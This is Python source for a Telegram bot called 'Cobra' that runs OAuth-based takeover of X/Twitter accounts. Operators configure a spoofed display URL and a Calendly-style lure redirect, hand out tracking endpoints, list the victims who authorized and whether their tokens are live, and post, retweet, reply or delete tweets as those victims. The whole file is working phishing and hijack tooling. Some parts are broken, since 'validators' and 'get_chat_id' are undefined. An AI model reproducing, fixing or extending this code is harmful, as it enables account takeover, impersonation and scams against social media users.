
import re
import uuid
from bot.handlers import keyboards

from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ChatMemberStatus

from shared.db import get_db
from shared.config import config
from shared.utils import parse, permission_check, tweet, handle_successful_tweet, handle_token_refresh_and_retry, handle_generic_error

parse_mode = "MarkdownV2"

db = get_db()
groups = db["groups"]

DOMAIN = config["DOMAIN"]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    full_name = parse(update.effective_user.full_name)

    reply_markup = keyboards.add_to_group()
    text = f"🐍 *Welcome to Cobra, _{full_name}_*\\! 🐍\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def unsubscribed(update, context):
    chat_id = update.effective_chat.id

    reply_markup = keyboards.unsubscribed()
    text = "❗ *JOIN THE CHANNEL TO USE COBRA* ❗\n\n_⚠️ It seems that you aren't in the channel\\. Join the channel using the button below to continue\\._"
    
    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def help(update, context) -> None:
    chat_id = update.effective_chat.id
    
    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 🔁 */post\\_retweet* \\<username\\> \\<tweet\\_id\\> \\- Retweets a tweet on behalf of the user\\.\n *•* 💬 */post\\_quote\\_tweet* \\<username\\> \\<tweet\\_url\\> \\<message\\> \\- Quotes a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 👤 */whitelist* \\<id\\> \\- Adds/removes a user id from the command whitelist\\.\n *•* 📄 */display\\_whitelist* \\- Displays the list of users authorized to use admin commands in the group\\.\n *•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays your personal endpoint\\.\n *•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n *•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n *•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n *•* 🌀 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter and refreshes endpoints\\.\n *•* 💬 */set\\_replies* \\- Enables/disables replies for tweets\\.\n *•* 𝕏 */check\\_auth* \\<username\\> \\- Checks if a user is still authorized\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
    await context.bot.send_message(chat_id, text, parse_mode)

async def setup(update, context):
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, setup_command=True): return

    group = groups.find_one({"group.id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    owner = next(admin.user for admin in await context.bot.get_chat_administrators(chat_id) if admin.status == ChatMemberStatus.ADMINISTRATOR)
    owner_id = owner.id
    owner_fullname = parse(owner.full_name)

    chat_title = update.effective_chat.title

    group_data = {
        "owner_id": owner_id,
        "group": {
            "id": chat_id,
            "title": chat_title
        },
        "client": {
            "id": None,
            "secret": None
        },
        "spoof": "https://calendly.com/cointele",
        "redirect": "https://calendly.com/cointele",
        "replies": False,
        "whitelist": [],
        "identifiers": [
            {
                "user_id": owner_id,
                "identifier": str(uuid.uuid4())
            }
        ],
        "users": []
    }
    groups.insert_one(group_data)

    text = f"✅ *Group successfully setup for OAuth\\.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {parse(chat_id)}\n┣  *Group Name:* {parse(chat_title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* {owner_fullname}\n\n💬 _Use the */help* command to get the list of available commands\\._"
    await context.bot.send_message(chat_id, text, parse_mode)

async def display_endpoint(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups): return

    user_id = update.effective_user.id

    group = groups.find_one({"group.id": chat_id})
    matched = next(i for i in group["identifiers"] if i["user_id"] == user_id)

    client_id = group["client"]["id"]
    client_secret = group["client"]["secret"]

    if not client_id or not client_secret:
        text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set\\_client\\_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}_\\."
    else:
        identifier = matched["identifier"]
        endpoint = parse(DOMAIN + f"/oauth?i={identifier}")

        reply_markup = keyboards.refresh()
        text = f"🔗 *Your endpoint*: {endpoint}"

    await context.bot.send_message(chat_id, text, parse_mode)

async def set_client_id(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_id <client_id>')
    
    group = groups.find_one({"group.id": chat_id})

    client_id = args[0]
    client_secret = group["client"]["secret"]

    if re.match("^[a-zA-Z0-9]+$", client_id) and len(client_id) == 34:
        groups.update_one(
            {"group.id": chat_id},
            {"$set": {f"client.id": client_id}}
        )
        
        text = f"✅ *Client ID has successfully been set\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
    else:
        text = "⚠️ *The client ID provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_client_secret(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return

    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_secret <client_secret>')
    
    group = groups.find_one({"group.id": chat_id})

    client_secret = args[0]
    client_id = group["client"]["id"]

    if (len(client_secret) == 50 and re.match("^[a-zA-Z0-9_-]+$", client_secret)):
        groups.update_one(
            {"group.id": chat_id},
            {"$set": {f"client.secret": client_secret}}
        )
        
        text = f"✅ *Client secret has successfully been set for this group\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
    else:
        text = "⚠️ *The client secret provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_redirect(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_redirect <url>')

    url = args[0]
    if validators.url(url):
        groups.update_one(
            {"group.id": chat_id},
            {"$set": {"redirect": url}}
        )

        text = f"✅ *Redirect URL successfully set to {parse(url)}\\.*"
    else:
        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)
        
async def set_spoof(update, context) -> None:
    chat_id = get_chat_id(update)
    
    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_spoof <url>')

    url = args[0]
    if validators.url(url):
        group = groups.find_one({"group.id": chat_id}, {"identifiers": 1})
        identifiers = []

        for item in group["identifiers"]:
            item["identifier"] = f"{DOMAIN}/oauth?i={uuid.uuid4()}"
            identifiers.append(item["identifier"])

        groups.update_one(
            {"group.id": chat_id},
            {"$set": {"spoof": url, "identifiers": group["identifiers"]}}
        )

        text = f"✅ *Spoofed URL successfully set to {parse(url)}\\. All endpoints have been refresh\\.*"
    else:
        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
           
    await context.bot.send_message(chat_id, text, parse_mode)

async def display_users(update, context, page=1, message_id=None) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups): return
        
    group = groups.find_one({"group.id": chat_id})
    users = group['users']
    online_users = [u for u in users if u.get("access_token")]
    if users:
        user_count = len(users)
        sorted_users = sorted(users, key=lambda u: (bool(u.get('access_token')), -u['timestamp'].timestamp()))

        users_per_page = 10
        total_pages = max(1, -(-user_count // users_per_page))
        
        page = max(1, min(page, total_pages))
        
        start_idx = (page - 1) * users_per_page
        end_idx = start_idx + users_per_page
        paginated_users = sorted_users[start_idx:end_idx]

        user_texts = []
        for user in paginated_users:
            authorized_at = parse(user['timestamp'].strftime('%m-%d-%Y'))
            username = user['username']
            access_token = user.get('access_token')

            user_text = (
                f"> {'🟢' if access_token else '🔴'} *[{parse(username)}](https://x\\.com/{username})* \\| _{authorized_at}_\n"
            )
            user_texts.append(user_text)
            
        reply_markup = keyboards.users_pagination(paginated_users, page, total_pages, users_per_page)
        text = f"*👤 Authenticated Users* \\({len(online_users)}/{len(users)}\\)\n\n" + "\n\n".join(user_texts)

        if message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id, 
                message_id=message_id, 
                text=text, 
                parse_mode=parse_mode, 
                reply_markup=reply_markup, 
                disable_web_page_preview=True
            )        
        else:
            message = await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup, disable_web_page_preview=True)
            context.user_data["message_id"] = message.message_id
    else:
        text = "*👤 Authenticated Users*\n\n> Nothing to see here 👀"
        await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)

async def post_tweet(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return

    args = context.args
    if len(args) < 2: return await update.message.reply_text('⚙️ Usage: /post_tweet <community_id|optional> <username> <message>')

    community_id = int(args[0]) if type(args[0]) == int else 0
    is_community = True if type(args[0]) == int else False

    username = args[0] if not is_community else args[1]
        
    group = groups.find_one({"group.id": chat_id})

    user = next((u for u in group.get('users', []) if u['username'].lower() == username.lower()), None)
    if not user:
        text = f"⚠️ *User _{parse(username)}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()for arg in (args[1:] if not is_community else args[2:])).replace('\\n', '\n')
    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), user["username"]
    if access_token:
        res, r = tweet(chat_id=chat_id, token=access_token, message=message, is_community=is_community, community_id=community_id)
        
        if res.status_code == 201:
            return await handle_successful_tweet(context, chat_id, username, r, is_community=is_community)
            
        if res.status_code == 401:
            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)
    
        if res.status_code == 403:
            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)

        await handle_generic_error(context, chat_id, res, r)
    else:
        text = f"❌ *User _[{parse(username)}](https://x\\.com/{parse(username)})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)